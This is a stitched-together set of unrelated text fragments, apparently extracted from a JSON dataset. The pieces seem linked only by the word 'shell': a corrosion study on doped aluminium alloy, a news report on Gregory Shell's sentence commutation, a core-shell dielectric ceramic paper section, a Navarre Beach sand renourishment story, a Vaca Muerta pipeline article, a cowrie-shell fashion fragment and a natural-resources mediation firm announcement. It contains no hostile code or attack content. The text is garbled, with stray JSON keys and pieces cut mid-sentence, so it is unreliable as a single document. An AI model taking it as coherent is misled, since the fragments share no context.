(Fig. 8a No. 3, c No. 2, e No. 4). In FACS, Fe amorphous particles react with Cl\u2212 through 2Fe + 6HCl \u2192 2FeCl 3 + 3H 2 , resulting in white corrosion products on the Fe amorphous surface (Fig. 8b No. 2, d No. 4, e No. 3). The corrosion damage of Fe amorphous particles is less severe than that of Al. In 10% Fe amorphous particle-doped FACS, most Fe amorphous particles remain unaffected by corrosion (Fig. 8b No. 1).\n\nAdditionally, oxygen-rich products, identified as Al hydroxides, were found in FACS (Fig. 8b No. 3, c No. 1, d No.3, e No. 1). In aluminum alloys, free electrons from the primary battery system cause the cathode to electrolyze water, producing hydroxide ions. These ions react with Al3+ to form insoluble Al(OH) 3 30, creating a passivation layer that blocks Cl\u2212 and acts as a barrier to the corrosive electrolyte13,31. This phenomenon was not observed in Al-12Si alloy, suggesting that Fe amorphous particles facilitate passivation layer formation. Furthermore, Fe amorphous particles contribute to corrosion resistance by acting as a \u201cpassivation layer\u201d themselves, blocking deep Cl\u2212 attacks and protecting the matrix, thus enhancing the corrosion resistance of the Al-12Si alloy.",

            "content": "In one of his last official acts, former President Joe Biden commuted the life sentence of Gangster Disciples co-chairman Gregory Shell, one of almost 2,500 \u201cnon-violent\u201d drug offenders to whom he granted clemency.\n\nThe Biden administration didn\u2019t provide details about when any of the people he granted clemency to would be freed from prison. The order said the president would \u201ccommute the total sentence of imprisonment\u201d of everyone on the list.\n\nOn Tuesday afternoon, the U.S. Bureau of Prisons website said Shell remained at the federal maximum security prison in Florence, Colorado, where he and Gangster Disciples kingpin Larry Hoover are serving life sentences.\n\nBiden released a statement explaining his mass commutations, saying, \u201cThis action is an important step toward righting historic wrongs, correcting sentencing disparities, and providing deserving individuals the opportunity to return to their families and communities after spending far too much time behind bars.\u201d\n\nBiden, when he was a U.S. senator, had supported some of the harsh decades-old drug sentences his latest action was designed to fix.\n\nUnlike pardons, commutations don\u2019t provide forgiveness for a crime, but both actions serve to cut or eliminate federal prison terms. Pardons also help ex-offenders get jobs and restore their civil rights, such as voting and possessing guns.\n\nShell and Hoover both have separate requests before the U.S. District Court in Chicago asking for reductions of their federal prison terms. They\u2019re seeking relief under the First Step Act, a 2018 law signed by President Donald Trump in his first term. It dealt, in part, with historic sentencing disparities for crack cocaine and powder cocaine.\n\nHoover, 74, was convicted of murder after a trial in state court in December 1973, and a judge sentenced him to 150 to 200 years in state prison. Decades later, prosecutors alleged that Hoover kept running the gang from prison. After a highly publicized trial, U.S. District Judge Harry Leinenweber sentenced the gang leader in 1998 to life in prison for engaging in a continuing criminal enterprise.\n\nIn recent months, prosecutors have strongly urged U.S. District Judge Robert Blakey to keep Hoover and Shell in prison. They say Shell, the second-ranking leader of the GDs, ruled over tens of thousands of the gang\u2019s members in Chicago and other cities.\n\nShell took orders from Hoover, who was in prison for his murder conviction, and visited the kingpin behind bars about 100 times, prosecutors say. They noted that Shell was also convicted of murder in the 1970s. He was later convicted of engaging in a continuing criminal enterprise along with Hoover and others.\n\n\u201cShell has well earned his life sentence, and he is not the type of defendant Congress intended to benefit in enacting the First Step Act,\u201d federal prosecutors wrote in a court filing in September.\n\nProsecutors said that if Shell were sentenced today, he would get the same life prison term because \u201cthe sentencing court found that he was second-in-command of a gang with daily profits that totaled $300,000, or 4.5 kilograms of crack cocaine, the profits of which amounted to a whopping $109 million in gross receipts each year from the sale of narcotics.\u201d\n\nIn October, though, Shell\u2019s attorney, Andr\u00e9a Gambino, called for his release, saying in a court filing that he wasn\u2019t accused or convicted of violent crimes in his federal case and that a life sentence would be \u201chighly unlikely\u201d now.\n\nAsked Tuesday about Shell\u2019s commutation, Gambino said, \u201cWe\u2019re very pleased. This is a positive first step toward correcting the draconian sentence imposed on Mr. Shell three decades ago and reuniting him with his many family members and friends.\u201d\n\nIn recent years, other former members of Hoover\u2019s inner circle, including Johnny \u201cCrusher\u201d Jackson, have been granted early release from prison under the First Step Act.",

            "content": "Phase-field simulation for designing polymorphic heterogeneous shell\n\nWe first conduct phase-field simulation to theoretically predict the potential of designing polymorphic heterogeneous shells for improving energy storage properties. To enhance the feasibility of the simulation, we choose NN with the coexistence of ferroelectric and antiferroelectric phases as the core, which is simplified into a long-range ordered ferroelectric polarization configuration owing to the irreversible transformation of the unstable antiferroelectric phase into ferroelectric phase under electric fields23. NN is gradually dissolved into BNT, as the parent material of the shell, for controlling the domain structure or local polarization configuration of the shell. As shown in Fig. 1a, core-shell dielectrics with long-range ordered ferroelectric polarization exhibit large polarization hysteresis and rapid polarization saturation behaviors. With the gradual introduction of NN in the shell, domain size significantly decreases and the long-range polarization order is broken, resulting in enhanced local polarization heterogeneity (Fig. 1b, c). Ultimately, the polar core with polymorphic heterogeneous shell can be established in dielectrics (Fig. 1c). It is recognized that the enhancement of local polarization heterogeneity can significantly reduce the energy barrier and stress of polarization rotation and decrease polarization hysteresis, revealing a gradual slimmer P-E loop with smaller P r and more delayed polarization saturation2. Notably, there is no significant decrease in P m , which can be attributed to the influence of the internal strongly polar core and the enhancement of polarization texture along the electric field direction in polymorphic heterogeneous shell5,14. As a result, large polarization fluctuations and delayed polarization saturation can be achieved by designing polymorphic heterogeneous shell in core-shell dielectrics, resulting in significant increases in W rec and \u03b7 of 85% and 35% from the simulated P-E loops under the same electric field, respectively, compared to the dielectrics with polar core and microdomain shell structure. These demonstrate the enormous potential of this strategy to enhance comprehensive energy storage performance.\n\nFig. 1: Design of polymorphic heterogeneous shell by phase-field simulation for ultrahigh energy storage. Comparative display of domain structures, polarization configurations, and normalized P-E loops with different heterostructures including a Polar core with microdomain shell, b Polar core with nanodomain shell, and c Polar core with polymorphic heterogeneous shell. The light green rectangles represent the enlarged domain structure or local polarization configuration in the shell. Full size image\n\nMicro core-shell heterostructure\n\nTo validate our design ideas, scanning electron microscope (SEM) and transmission electron microscopy (TEM) are performed to reveal the microstructure of 0.5NN-0.5BNT-cs ceramics. As shown in Fig. 2a and Supplementary Fig. 2, the sample exhibits good sintering quality with a dense microstructure and no obvious voids. A distinct microscopic heterostructure with dark core regions of hundreds of nanometers inside grains can be proven to be core-shell structure. Notably, a pure perovskite structure can be observed in 0.5NN-0.5BNT-cs sample by high-resolution synchrotron X-ray diffraction (XRD), indicating that the internal cores are not formed by impurities (Supplementary Fig. 3). Combining the previous studies, temperature-dependent dielectric spectra and synchrotron XRD results can confirm that the nature of 0.5NN-0.5BNT-cs should be relaxor antiferroelectric (Supplementary Fig. 4)21,24. The evident core-shell heterostructures can also be further analyzed through TEM (Fig. 2b\u2013d and Supplementary Fig. 5). As shown in Fig. 2b, typical striped domains with widths varying several dozen nanometers can be clearly found in the core regions, demonstrating strong polarity. In contrast, no obvious domain morphology is observed in the shell regions and the contrast is weak, indicating a lack of long-range ferroelectric order. According to the results of selected area electron diffraction (SAED) patterns along [100] c , [110] c , and [111] c (Fig. 2c,d and Supplementary Fig. 6), the pure perovskite structure can also be verified in the core and shell regions25. The (ooe)/2 and (ooo)/2 (o is odd and e is even) superlattice diffraction spots found in the core and shell regions suggest the existence of in-phase and anti-phase oxygen octahedral tilts based on the conclusions by Glazer, respectively, which is also reflected by the synchrotron XRD result (Supplementary Fig. 3)26. Furthermore, as shown in Fig. 2c, two distinct satellite peaks are found around the (001)/2 superlattice diffraction point in the shell region, which is an important feature of antiferroelectrics, once again indicating the relaxor antiferroelectric nature of 0.5NN-0.5BNT-cs ceramics27.\n\nFig. 2: Microstructure, domain structure, elemental distribution and breakdown simulation of 0.5NN-0.5BNT-cs ceramic. a SEM images of polished and thermally etched 0.5NN-0.5BNT-cs. b Room-temperature bright-field TEM images of 0.5NN-0.5BNT-cs and SAED patterns recorded along the c [100] c , and d [110] c for the core and shell regions, where red arrows point to superlattice diffraction points and yellow arrows point to satellite diffraction points. e EDS mapping images and f EDS line scan across core and shell in 0.5NN-0.5BNT-cs by TEM. Simulation of g Electrical field distribution, and h Electric tree evolution for 0.5NN-0.5BNT, 0.5NN-0.5BNT-s, and 0.5NN-0.5BNT-cs. Full size image\n\nIt is recognized that the formation of core-shell structure is affected by many factors such as phase formation temperature12, sintering temperature15, diffusion rates of elements14,28,29, and the synergistic diffusion effect of multiple ions13,30,31. To analyze the origin of the core-shell structure and different ferroelectric nature between them, energy dispersive X-ray spectroscopy (EDS) is performed on 0.5NN-0.5BNT-cs sample by TEM and SEM (Fig. 2e, f and Supplementary Fig. 7). Na and Nb are mainly concentrated in the core regions to form NN solid solutions, where Bi and Ti are almost absent, contributing to the visible striped domains with a long-range ordered polarization. In contrast, the distribution of Na, Bi, Nb and Ti in the shell regions is diffuse and disordered, exhibiting larger compositional disorder than that of cores, which causes a strong random field manifested as the speckle domain morphology with weak contrast. There is a diffusion transition region of approximately 150 nm between the core and shell, suggesting that the core region formed by incomplete diffusion of BNT into the NN matrix (Fig. 2f). The sintering temperature of 0.5NN-0.5BNT-cs sample is chosen at 1160 \u00b0C in this work, which is very close to that of pure BNT (1150 \u00b0C) and far from that of pure NN (1400 \u00b0C). Based on the above analysis results and the sintering characteristics of ceramics, it can be speculated that the small calcined BNT particles can diffuse and dissolve with each other, and combine into large particles, while NN particles are difficult to melt with each other and can only partially diffuse into BNT to form shell regions. Furthermore, we subject the calcined BNT and NN particles to long-term high-energy ball milling treatment for significantly reduce the particle size, which can accelerate the melting kinetics process of BNT and NN particles to form obviously large shells but small cores during sintering.\n\nThe breakdown characteristics are closely related to the microstructure of the ceramics. According to the statistical results, the average grain sizes (G a ) of 0.5NN-0.5BNT without core-shell structure and 0.5NN-0.5BNT-cs are about 3.66 \u03bcm and 4.05 \u03bcm (Supplementary Fig. 8), which means that there is no significant difference in grain boundary density. To better understand the advantage of the core-shell microstructure during the dielectric breakdown process, 2D finite-element method is used to simulate the electric field distribution and electric tree evolution of 0.5NN-0.5BNT, 0.5NN-0.5BNT-s (neglecting the existence of cores), and 0.5NN-0.5BNT-cs by combining the intrinsic properties (dielectric constant) and extrinsic structural features (grains, grain boundaries, cores, shells, and core-shell interfaces) of the ceramics (Fig. 2g, h and Supplementary Fig. 9)32,33. It is known that a strong electric field is concentrated in the grain boundaries owing to the lower dielectric constant than that of grains. Similar electric field distribution and electric tree evolution behavior with close breakdown time can be obviously discovered in 0.5NN-0.5BNT and 0.5NN-0.5BNT-s samples. The emergence of the core-shell structure significantly reduces the electric field on grain boundaries and makes the electric field distribution more uniform, avoiding the occurrence of large local electric fields and premature breakdown. It can also be found that core-shell interfaces can hinder the propagation of electric trees. When 0.5NN-0.5BNT ceramic experiences breakdown, exhibiting that an electric tree penetrates the entire sample, the electric tree of 0.5NN-0.5BNT-cs only propagates about 2/3 (Fig. 2h). Consequently, the establishment of micro core-shell heterostructures is realized in 0.5NN-0.5BNT-cs ceramic, which can significantly improve dielectric breakdown characteristics and enhance E b .\n\nLocal heterogeneous polarization configuration\n\nTo further explore the local polarization information of the core and shell regions, atomic-resolution high-angle annular dark-field scanning transmission electron microscopy (HAADF-STEM) is performed on 0.5NN-0.5BNT-cs ceramic along [110] c . As shown in Fig. 3a, c, long-range ordered polarization configuration can be clearly obtained in the core region, which contributes to the visible striped domains. However, long-range disordered but locally ordered chaotic polarization configurations are found in the shell region (Fig. 3b, c), which can be defined as a polymorphic heterogeneous shell, revealing the speckle domain morphologies with weak contrast under TEM. According to the polarization vector analysis and two-dimensional contours of polarization angles, the locally ordered regions with a similar polarization direction can form polymorphic polar nanoregions (PNRs) with a size of only ~1-3 nm34. Combining the wider distribution range of polarization angles in the shell region (Fig. 3d), higher activity and flexible external electric field response can be provided by smaller polymorphic PNRs, resulting in small P r and decreased polarization hysteresis35. Furthermore, the polarization magnitudes in the shell region also exhibit a more disordered distribution behavior compared to the core region (Fig. 3e, f). The regions with near-zero polarization magnitude in the shell can be considered as the cubic phase matrix, presenting a landscape where island-shaped polymorphic PNRs float in a cubic ocean, which can be collectively referred to as the coexisting polymorphic nanoclusters and cannot be observed in the core region. The higher average polarization magnitude (M ave ) of 7.5 pm can be counted in the core region than that of the shell region (M ave = 5.8 pm), demonstrating the existence of strongly polar cores and weakly polar shells. However, it should be noted that the M ave of the shell region is also comparable to that of some reported perovskite relaxors with high polarization16,36. This distinctive polarization configurations in core-shell dual-phase 0.5NN-0.5BNT-cs ceramic is expected to efficiently maintain large polarization fluctuations and small hysteresis while delaying polarization saturation.\n\nFig. 3: Local polarization configuration of 0.5NN-0.5BNT-cs ceramic.

Full size image\n\nAs shown in Fig. 3g and Supplementary Fig. 10, the intensity distributions of A-site and B-site atomic columns are also extracted in 0.5NN-0.5BNT-cs ceramic to qualitatively analyze the distribution behavior of elements and their relationship with polarization configurations. It is known that the intensity of atomic columns is positively correlated with atomic number (Z)37. The core region with polarization vectors along the [1-10] direction corresponds to weaker A-site and stronger B-site atomic column intensity, indicating that this region is enriched with Na and Nb atoms to form an orthorhombic phase zone owing to Z Na < Z Bi and Z Nb > Z Ti . The stronger A-site and weaker B-site atomic column intensities can be observed in the core region with polarization vectors along the [001] or [00-1] direction. It can be speculated that some Bi and Ti elements also diffuse into the NN matrix and drive the transformation of internal polarization configuration. The absence of Bi and Ti elements in the core regions may be attributed to their limited diffusion and difficulty in being detected by low-resolution EDS. It is precisely because of the minimal diffusion of Bi and Ti that the long-range ordered polarization configuration of the core region has not been severely disrupted. In the shell region, both A-site and B-site atomic column intensities exhibit a significantly disordered distribution state, indicating a strong component disorder, which can cause local polarization heterogeneity. Therefore, the distribution behavior of different elements may be an important origin for the simultaneous formation of long-range ordered strongly polar core and polymorphic heterogeneous shell in 0.5NN-0.5BNT-cs ceramic.\n\nEnergy storage performance of 0.5NN-0.5BNT-cs ceramic\n\nTo evaluate the energy storage potential of 0.5NN-0.5BNT-cs ceramics, we measure the unipolar P-E loops until breakdown (Fig. 4a and Supplementary Fig. 11). The slim P-E loops with low P r and small hysteresis can be clearly found in 0.5NN-0.5BNT-cs ceramic under different electric fields. During the electric field loading process, the \u03b7 remains almost unchanged and always exceeds 85.0% (Fig. 4b), indicating that the impacts of strong polarization reversal in cores and polarization response mismatch between cores and shells on hysteresis have been effectively suppressed, even under a high electric field of 70 kV mm-1. Encouragingly, a high W rec of 12.7 J cm-3 and an impressive \u03b7 of 87.2% can be realized in 0.5NN-0.5BNT-cs ceramic by designing a polymorphic heterogeneous shell. On the basis of improving \u03b7, W rec increases by 2.7 times compared to the reported 0.5NN-0.5BNT relaxor antiferroelectric ceramic (W rec = 4.7 J cm-3) without core-shell structure16. Furthermore, as summarized in Fig. 4d, e and Supplementary Fig. 12, the excellent comprehensive energy storage properties achieved in 0.5NN-0.5BNT-cs ceramics show breakthrough progress in the recently reported core-shell dielectric ceramics13,14,38,39, which also demonstrates great competitiveness compared to other lead-free energy storage ceramics.\n\nFig. 4: Energy storage performance of 0.5NN-0.5BNT-cs ceramic. a Room-temperature unipolar P-E loops of 0.5NN-0.5BNT and 0.5NN-0.5BNT-cs. b W rec , \u03b7, c P m , and P r of 0.5NN-0.5BNT-cs and 0.5NN-0.5BNT as a function of the electric field up to E b . d Comparisons of W rec versus \u03b7 between 0.5NN-0.5BNT-cs and reported core-shell heterostructure ceramics.

Full size image\n\nThe improvement of energy storage performance for 0.5NN-0.5BNT-cs ceramics should be attributed to the largely enhanced E b , improved polarization fluctuations, and delayed saturation behavior with small hysteresis. In terms of breakdown characteristics, the bandgap (E g ) of 0.5NN-0.5BNT-cs (2.94 eV) is larger than that of 0.5NN-0.5BNT (2.62 eV) (Supplementary Fig. 13), making it difficult for electrons to jump from the top of the valence band to the bottom of the conduction band, which serves as an intrinsic contribution to enhance E b 40. The appearance of core-shell structure and core-shell interface makes the electric field distribution more uniform and avoids the occurrence of high local electric fields at grain boundaries, which also hinder the propagation of electric trees. In addition, benefiting from the core-shell structure, the resistance value at 450 \u00b0C of 0.5NN-0.5BNT-cs is almost twice that of 0.5NN-0.5BNT (Supplementary Fig. 14). The above factors significantly enhance E b from 38 to 70 kV mm-1. From the perspective of polarization, compared to 0.5NN-0.5BNT, large P m , small P r , and approximate polarization saturation delay degree can be achieved in 0.5NN-0.5BNT-cs ceramic (Fig. 4a, c). Firstly, large P m can be attributed to the internal strongly polar cores with large-sized domains and the enhancement of polarization texture along the electric field direction in polymorphic heterogeneous shells under high electric field5,14. The diffusion of antiferroelectric-ferroelectric phase transition in relaxor antiferroelectrics can also contribute to large polarization under electric fields16. Moreover, a higher room temperature dielectric constant can be observed in 0.5NN-0.5BNT-cs (Supplementary Fig. 4), leading to a larger polarization response under the same applied electric field. Secondly, higher activity and flexible external electric field response can be provided by ultra-small polymorphic PNRs in shells, which can decrease P r and polarization hysteresis. The effects of strong polarization reversal in cores and polarization response mismatch between cores and shells have been effectively suppressed through long-term high-energy ball milling to reduce the core size, maintaining low P r and small polarization hysteresis. Finally, based on the large random field caused by compositional disorder, polymorphic heterogeneous shells can also suppress the fast polarization saturation behavior of small-sized polar cores, achieving delayed polarization saturation. Therefore, outstanding overall energy storage properties can be realized 0.5NN-0.5BNT-cs core-shell dual-phase dielectrics.\n\nStability and charge-discharge properties of 0.5NN-0.5BNT-cs ceramic\n\nTemperature, frequency, and cycling stability are crucial indicators to ensure stable operation of dielectric capacitors in harsh environments. The slim temperature-, frequency- and cycling-dependent unipolar P-E loops can be found in 0.5NN-0.5BNT-cs ceramics under a high electric field of 50 kV mm-1 (Supplementary Fig. 15). In a wide temperature range, 0.5NN-0.5BNT-cs ceramics exhibit excellent temperature stability with high W rec about 8.2 \u00b1 0.1 J cm-3 and high \u03b7 above 85.0% (Fig. 4f), which is related to the temperature insensitive phase structure (Supplementary Fig. 16) and dielectric spectra (Supplementary Fig. 4). The excellent frequency stability of energy storage performance can also be obtained in 0.5NN-0.5BNT-cs ceramics, in which W rec fluctuates slightly around 7.5 J cm-3 with \u03b7 exceeding 80.0% (Fig. 4g). Furthermore, when the 0.5NN-0.5BNT-cs sample is subjected to 106 cycles of electric fields, W rec and \u03b7 can be well stabilized near 7.6 J cm-3 and 80.0%, respectively, indicating outstanding cycling stability (Supplementary Fig. 15c, d). The charge-discharge properties of 0.5NN-0.5BNT-cs ceramics are also been tested to measure the application potential. Both underdamped and overdamped discharge waveforms with decent regularity can be observed under different electric fields (Supplementary Fig. 17). As shown in Fig. 4h, the P D and discharge energy density (W D ) of 0.5NN-0.5BNT-cs ceramic grow with increasing electric field, achieving an ultrahigh P D of 418.5 MW cm-3 and high W D of 2.9 J cm-3. It should be noted that the stored energy density can be rapidly released up to 90% at the nanosecond level of 58.1 ns. Therefore, 0.5NN-0.5BNT-cs ceramics exhibit excellent comprehensive performance with preferable stability, making promising application potential for advanced capacitors.",

Santa Rosa County Public Works Director Michael Schmidt said it is estimated 580,000 cubic yards of sand will be needed to fully revitalize the Navarre Beach coastline this time around.\n\nThe project got underway just before Christmas and it is estimated that contractors will be ready to embark on Phase 3 of the four phase project this week.\n\nAssistant County Administrator Jared Lowe said that despite mechanical issues that have twice required the vessel pulling the sand from the floor of the Gulf to be placed in dry dock, the entire project should be completed by the end of January.\n\n\"It's been pretty amazing, really,\" he said.\n\nCrews are working all day and all night and will place around 700 feet of sand on Navarre Beach each day from approximately 900 feet east of the Navarre Beach Pier to the Gulf Islands National Seashore property, according to a news release issued by the county.\n\nThe project was begun on the west end of the beach, where it runs into the boundary of National Seashore.\n\nMechanical issues were responsible for forcing the company conducting the beach renourishment to complete Phase 2 of the project before getting underway with Phase 1, Lowe said.\n\nWith Phase 1 expected to have been finished by the weekend, Phase 3, renourishing an area between Beach Access 39A eastward to Beach Access 38B, is slated to get underway this week.\n\nDuring the transition to Phase 3, heavy equipment will be utilized to move pipes from what is known as a subline location at 7631 Gulf Boulevard to a second such location near Beach Access 39A, a press release from the county said. The staging area was expected to be moved from Beach Access 37A to the east end of the Navarre Beach Pier parking lot.\n\nAll work is weather and mechanical-issue dependent and dates may not be exact.\n\nThe county warned visitors to the beach against entering restricted areas of Navarre Beach during while the project is ongoing.\n\nMore: Her work to protect endangered sea turtles is saving Navarre resident Jennifer Starr\n\n\"For safety reasons, residents and visitors should wait until these areas have officially reopened before accessing renourished sections to search for shells,\" it said. \"Beaches surrounding the construction area will be open to the public and sand ramps will be placed over the pipeline to allow beachgoers access to the gulf.\"\n\nCounty staff are monitoring for endangered species during the restoration project and relocating animals, including for sea turtles.\n\nThe effort to rebuild Navarre Beach began in the immediate aftermath of Hurricane Sally when the Federal Emergency Management Agency embarked on a damage assessment. Following the assessment FEMA agreed to cover the bulk of the cost of placing sand on approximately 3.5 miles of Navarre Beach.\n\nThe project is being funded from the Beach Berm Restoration Budget and with Federal Emergency Management Agency funds, Schmidt said. It is estimated the cost of completing the renourishment will be $11.4 million, but an overall project cost will be established based on the amount of sand placed to meet the permitted restoration profile. It could be more or less than the bid amount.\n\nCommissioners voted in April of 2024 to go all in on restoring the beach, which in September of 2020 lost an estimated 254,000 cubic yards of sand to Hurricane Sally.",

The midstream project has not only gained interest from local Argentine producers seeking to boost output, but also from global oil majors Chevron and Shell.\n\nChevron and Shell both own operated and non-operated interests in the Vaca Muerta Basin. Shell operates the Cruz de Lorena, Sierras Blancas, Coiron Amargo Sur Oeste (Shell interest 90% each), and Bajada de A\u00f1elo (Shell interest 50%) areas, according to investor filings.\n\nChevron operates a 100% interest in the east area of the El Trapial Field for unconventional development and 100% in the El Trapial\u2019s conventional waterflood field.\n\nChevron holds a 50% non-operated interest in the Loma Campana and Narambuena concessions. There were 41 horizontal wells drilled in Loma Campana during 2023, per company filings.\n\nExperts say the US$3 billion Vaca Muerta Sur pipeline is one of Argentina\u2019s most significant infrastructure projects. It\u2019s expected to be developed under an ambitious new incentive regime to spur large capital investments within the nation.\n\nVaca Muerta Sur, which received unanimous shareholder approval to move forward in mid-December, is designed to transport up to 550,000 bbl/d from the Loma Campana field in Vaca Muerta to an export point on the Atlantic coast.\n\nThe crude pipeline can also be expanded to move 700,000 bbl/d \u201cif necessary,\u201d state-owned producer YPF SA told investors last month.\n\nThe pipeline will be developed by midstream company VMOS SA. Vaca Muerta Sur\u2019s initial shareholders included YPF SA, Vista Energy Argentina SAU, Pampa Energ\u00eda SA and Pan American Sur SA.\n\nThen later in December, Chevron Argentina SRL, Shell Argentina SA and Pluspetrol SA exercised their options to join as shareholders in the project.\n\nExxon Mobil agreed to sell its Vaca Muerta assets to Pluspetrol in November 2024.\n\nThe first phase of the Vaca Muerta Sur project is already under construction. The first tranche will carry 500,000 bbl/d from Vaca Muerta around 80 miles (~130 km) east to a pumping station in Allen, R\u00edo Negro.\n\nVMOS will develop the second tranche of Vaca Muerta Sur, which will carry crude around 273 miles (~440 km) from Allen to an export terminal in Punta Colorada, R\u00edo Negro, on the Atlantic coast.\n\nVaca Muerta Sur\u2019s first phase is under construction and will carry crude from the Loma Campana field to a pumping station in Allen, R\u00edo Negro province. The second phase will carry crude from Allen to an Atlantic coast export point at Punta Colorada, R\u00edo Negro. (Source: Rystad Energy)\n\nYPF, the top Vaca Muerta producer, has secured 120,000 bbl/d of transport capacity on Vaca Muerta Sur, according to company filings.\n\nVista Energy, the second-largest producer behind YPF, secured 50,000 bbl/d of takeaway capacity.\n\nRELATED\n\nExxon Mobil to Sell Vaca Muerta Assets in Argentina to Pluspetrol\n\nVaca Muerta ramps up\n\nVaca Muerta oil production reached a new record of 400,000 bbl/d during the third quarter of 2024, a 35% increase year-over-year, according to a Rystad Energy analysis.\n\nProducers brought online an average of 40 Vaca Muerta horizontals per month in the third quarter, up from 34 in the second and 33 in the first, according to Rystad.\n\n\u201cA record 46 new wells were brought online in September [2024] alone, of which 39 were in the oil zone and the remainder in the gas zone, underscoring the continued operational efficiency and momentum of Argentina\u2019s flagship shale play,\u201d Rystad analysts said in a December report.\n\nVaca Muerta lateral lengths have grown 30% from 2018 through 2024, according to Rystad Energy data. (Source: RystadEnergy ShaleWellCube)\n\nVaca Muerta operators have also drilled longer and longer laterals in the play over time.\n\nLateral lengths for Vaca Muerta horizontals averaged approximately 8,900 ft in 2024, a 30% increase from 2018\u2019s average of around 6,800 ft, according to Rystad data.\n\nChevron has drilled some of the longest Vaca Muerta wells. The company has reported laterals extending up to 14,700 ft (2.78 miles).\n\nVaca Muerta producers are also testing the stacked pay potential of the shale play. YPF is the current leader testing multi-bench pad development on its Vaca Muerta asset, Rystad Vice President of Upstream Research Radhika Bansal told Hart Energy.\n\nProducers have mainly targeted Vaca Muerta\u2019s Lower and Middle benches due to their high effective porosities, high total organic content and low water saturations, according to Enverus Intelligence Research.\n\nRELATED\n\nChevron Pushing Longer Laterals in Argentina\u2019s Vaca Muerta Shale\n\nBarriers to growth\n\nThe involvement of the supermajors bodes well for Vaca Muerta Sur\u2019s momentum, experts say.\n\nBut the pipeline\u2019s construction still faces hurdles\u2014including financing. Producers with stakes in the pipeline have agreed to cover 30% of the project\u2019s roughly $3 billion price tag.\n\nThe remaining 70% is supposed to come from a syndicate of international banks, Bansal said.\n\n\u201cWe actually think this is going to be a crucial thing this year for Argentina\u2014seeing [financing] occurring,\u201d Lara said.\n\nRegulatory and political instability have been barriers for international capital to be deployed within Argentina. The Incentive Regime for Large Investments (R\u00e9gimen de Incentivo para Grandes Inversiones or RIGI) aims to address those concerns.\n\nThe RIGI ensures certain tax breaks and other benefits for large-scale investments that spur economic development and employment within Argentina. RIGI projects may also freely import and export goods without prohibitions or restrictions.\n\nTo be covered under RIGI, projects require a total minimum investment of US$2 billion, with at least $400 million deployed in the first two years of development.\n\nQualifying export projects will enjoy stability in taxes, customs, foreign exchange matters and dispute resolution mechanisms for 30 years after startup.\n\nVMOS aims to complete construction on the Vaca Muerta Sur extension during the fourth quarter of 2026 and commence commercial operations by summer 2027.\n\nBut depending on the fundraising process and the RIGI regulatory structure, that could be an ambitious timeline for Vaca Muerta Sur, Lara said.\n\n\u201cThe commitment is there; the investment is going to come,\u201d he said, \u201cbut when are you going to have it built?\u201d\n\nRELATED\n\nVista CEO: Bidding for Exxon\u2019s Vaca Muerta Assets \u2018Very Competitive\u2019",

While the shell was used as currency in a variety of ancient cultures around the world, it was especially prized in African cultures, where it signified prosperity and protection. Meanwhile, the National Museum of African American History and Culture notes that, in America, the shell is thought to be a totem used to resist enslavement. Justice Jackson herself is a descendant of enslaved people. The connection feels particularly prescient on Martin Luther King Jr. Day, which happened to coincide with the Inauguration. (This has only happened once before, on Bill Clinton\u2019s 1997 Inauguration Day.)\n\nBeyond its status as a protective talisman, the cowrie is also associated with womanhood and fertility. During his first term, Trump\u2014who was found liable for sexual abuse in May 2023\u2014made continuous efforts to erode women\u2019s rights, which included appointing Brett Kavanaugh, who was accused of attempted rape, to the Supreme Court.

Holliday has also served as chair of the World Business Council for Sustainable Development and chair of Mission Possible Partnership. He is the lead investor in RR and its chief advisor.\n\nMark Cutifani, the former CEO of Anglo American plc, current chair of Vale Base Metals, and former CEO of AngloGold Ashanti. Known for his leadership in transforming companies and advocating for responsible mining practices, Cutifani is also a board member of TotalEnergies and Laing O\u2019Rourke.\n\nOther members of the advisory council are:\n\nProf. Elizabeth Robinson, Acting Dean, Global School of Sustainability at the London School of Economics. A leading environmental economist, Robinson has also been the director of the LSE\u2019s Grantham Institute on Climate Change, and has over 25 years of research experience, particularly in low-income countries.\n\nDame Meg Taylor, former Secretary General of the Pacific Islands Forum. A leading advocate for conflict resolution and sustainable development, Taylor was founding vice president of the Compliance Advisor Ombudsman at the World Bank, and ambassador of Papua New Guinea to the US, Mexico and Canada.\n\nDr. Kandeh K. Yumkella, former UN Under-Secretary General, former founding CEO of the Sustainable Energy for All initiative, and former Director-General of UNIDO. A distinguished development and agricultural economist, Dr. Yumkella is now chairman of the Presidential Initiative on Climate Change, Renewable Energy and Food Security in Sierra Leone.\n\n\u201cWe are delighted to welcome these illustrious figures to our global advisory council. Geopolitical tensions, climate change, societal polarization and distrust may lead to more and more conflict over natural resources in the years ahead,\u201d Daniel Litvin, founder of RR, stated in a press release.\n\n\u201cIn this fraught context, we aim to create a space for balanced dialogue. With its senior and diverse perspectives, the council will help us identify how to create common ground between different groups, corporate, government, local community, and civil society,\u201d he added.\n\nLitvin previously founded Critical Resource, a leading advisory firm on sustainability and geopolitical risks which he sold in 2020 to ERM, the world\u2019s largest sustainability consulting firm. He is also a Visiting Senior Fellow at the London School of Economics and author of \u2018Empires of Profit: Commerce, Conquest and Corporate Responsibility\u2019.\n\nThe co-founder of RR is Chris Melville, formerly head of political risk with Tullow Oil, an Africa-focused upstream oil and gas company. Melville is a qualified community mediator and conflict resolution expert.\n\nGreenland example\n\nThe founding of RR follows US President Donald Trump\u2019s recent remarks about annexing Greenland, which has a strategic location and an abundance of critical mineral deposits, even if it means to use \u201cmilitary force\u201d.\n\n\u201cI think what\u2019s good about Greenland is it\u2019s bringing a lot of attention to natural resources,\u201d Holliday said in an interview with Bloomberg News last week. \u201cWhen I was born, there were 2.5 billion of us.

At DuPont, for example, he said that some business leaders \u201cweren\u2019t very good\u201d at taking in various perspectives, and so after they were dispatched into the field, they came back realizing \u201chow poor a job they were doing of listening.\u201d\n\nResource Resolutions, therefore, will have \u201cendless\u201d opportunities to smooth natural resource tensions through reconciliation, he added.\n\nThe venture, overseen by the global advisory council, will employ mediators and experts with experience working in natural resources and dealing with governments, local communities, hostile groups and commodities firms.

